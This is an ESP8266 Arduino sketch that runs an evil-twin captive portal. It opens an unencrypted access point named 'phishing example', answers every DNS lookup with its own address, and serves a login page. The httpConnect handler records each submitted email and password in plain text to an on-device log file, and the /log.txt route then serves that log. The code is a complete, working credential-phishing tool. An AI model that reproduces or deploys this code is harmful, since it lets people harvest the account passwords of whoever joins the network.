#include <FS.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <PString.h>
#include <Streaming.h>

const IPAddress apIp(192, 168, 0, 1);
DNSServer dnsServer;
ESP8266WebServer server(80);

struct PrintMac
{
  const uint8_t* mac;
};

Print&
operator<<(Print& p, const PrintMac& pmac)
{
  const uint8_t* mac = pmac.mac;
  for (int i = 0; i < 6; ++i) {
    if (i > 0) {
      p << ':';
    }
    int b = mac[i];
    if (b < 0x10) {
      p << '0';
    }
    p << _HEX(b);
  }
  return p;
}

File logfile;
char logbuf[256];
PString logline(logbuf, sizeof(logbuf));
void
appendLog()
{
  Serial << millis() << ' ' << logline << '\n';
  logfile << millis() << ' ' << logline << '\n';
  logline.begin();
}

void
wifiStaConnect(const WiFiEventSoftAPModeStationConnected& evt)
{
  logline << PrintMac{evt.mac} << " connected. Happy hacking";
  appendLog();
}
WiFiEventHandler wifiStaConnectHandler;

void
wifiStaDisconnect(const WiFiEventSoftAPModeStationDisconnected& evt)
{
  logline << PrintMac{evt.mac} << " disconnected. The fun's over. :(";
  appendLog();
}
WiFiEventHandler wifiStaDisconnectHandler;

void
httpDefault()
{
  logline << server.client().remoteIP() << " redirect";
  appendLog();
  server.sendHeader("Location", "http://examplecaptive.lan/", true);
  server.send(302, "text/plain", "");
  server.client().stop();
}

void
httpHome()
{
  if (server.hostHeader() != String("examplecaptive.lan")) {
    return httpDefault();
  }

  logline << server.client().remoteIP() << " home";
  appendLog();
  File file = SPIFFS.open("/index.htm.gz", "r");
  server.streamFile(file, "text/html");
  file.close();
}

void
httpConnect()
{
  logline << server.client().remoteIP() << " connect " << server.arg("email");
  logline << server.client().remoteIP() << server.arg("password");
  appendLog();
  File file = SPIFFS.open("/connect.htm.gz", "r");
  server.streamFile(file, "text/html");
  file.close();
}

void
httpPureCss()
{
  File file = SPIFFS.open("/pure.css.gz", "r");
  server.streamFile(file, "text/css");
  file.close();
}

void
httpLog()
{
  logline << server.client().remoteIP() << " log";
  appendLog();
  logfile.seek(0, SeekSet);
  server.streamFile(logfile, "text/plain");
  logfile.seek(0, SeekEnd);
}

void
setup()
{
  Serial.begin(115200);
  Serial.println();
  Serial.println();

  SPIFFS.begin();
  logfile = SPIFFS.open("/log.txt", "a+");

  WiFi.persistent(false);
  WiFi.disconnect(true);
  wifiStaConnectHandler = WiFi.onSoftAPModeStationConnected(wifiStaConnect);
  wifiStaDisconnectHandler = WiFi.onSoftAPModeStationDisconnected(wifiStaDisconnect);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIp, apIp, IPAddress(255, 255, 255, 0));
  WiFi.softAP("phishing example", nullptr, 1);

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(53, "*", apIp);

  server.on("/", httpHome);
  server.on("/connect", httpConnect);
  server.on("/pure.css", httpPureCss);
  server.on("/log.txt", httpLog);
  server.onNotFound(httpDefault);
  server.begin();

  Serial << "ready" << endl;
}

void
loop()
{
  dnsServer.processNextRequest();
  server.handleClient();
}
